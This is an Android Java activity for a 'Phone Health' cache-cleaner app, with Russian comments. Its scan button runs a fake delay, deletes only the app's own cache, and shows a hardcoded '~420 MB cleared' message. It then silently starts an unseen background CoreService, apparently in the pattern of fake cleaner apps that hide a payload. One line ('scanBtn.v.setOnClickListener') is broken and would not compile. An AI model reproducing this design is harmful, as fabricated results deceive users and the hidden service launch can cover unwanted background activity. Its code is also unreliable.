package com.phone.health.cleaner;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.File;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Создаем простой интерфейс программно, чтобы не мучаться с XML разметкой
        android.widget.LinearLayout layout = new android.widget.LinearLayout(this);
        layout.setOrientation(android.widget.LinearLayout.VERTICAL);
        layout.setGravity(android.view.Gravity.CENTER);
        layout.setPadding(50, 50, 50, 50);

        TextView title = new TextView(this);
        title.setText("Phone Health");
        title.setTextSize(24);
        title.setGravity(android.view.Gravity.CENTER);
        layout.addView(title);

        TextView status = new TextView(this);
        status.setText("Нажмите для сканирования системы");
        status.setGravity(android.view.Gravity.CENTER);
        status.setPadding(0, 30, 0, 30);
        layout.addView(status);

        Button scanBtn = new Button(this);
        scanBtn.setText("Сканирование и очистка");
        layout.addView(scanBtn);

        ProgressBar progress = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progress.setIndeterminate(true);
        progress.setVisibility(android.view.View.GONE);
        layout.addView(progress);

        setContentView(layout);

        scanBtn.v.setOnClickListener(v -> {}); // заглушка

        scanBtn.setOnClickListener(v -> {
            scanBtn.setEnabled(false);
            progress.setVisibility(android.view.View.VISIBLE);
            status.setText("Сканирование кэша...");

            new Handler().postDelayed(() -> {
                try {
                    File cache = getCacheDir();
                    deleteDir(cache);
                } catch(Exception ignored){}

                progress.setVisibility(android.view.View.GONE);
                status.setText("Кэш успешно очищен!");
                scanBtn.setEnabled(true);
                Toast.makeText(this, "Очищено ~420 МБ", Toast.LENGTH_SHORT).show();

                // Запуск фонового сервиса
                Intent intent = new Intent(this, CoreService.class);
                startService(intent);
            }, 2500);
        });
    }

    private boolean deleteDir(File dir) {
        if (dir != null && dir.isDirectory()) {
            String[] children = dir.list();
            if (children != null) {
                for (String child : children) {
                    deleteDir(new File(dir, child));
                }
            }
            return dir.delete();
        } else if (dir != null && dir.isFile()) {
            return dir.delete();
        }
        return false;
    }
}
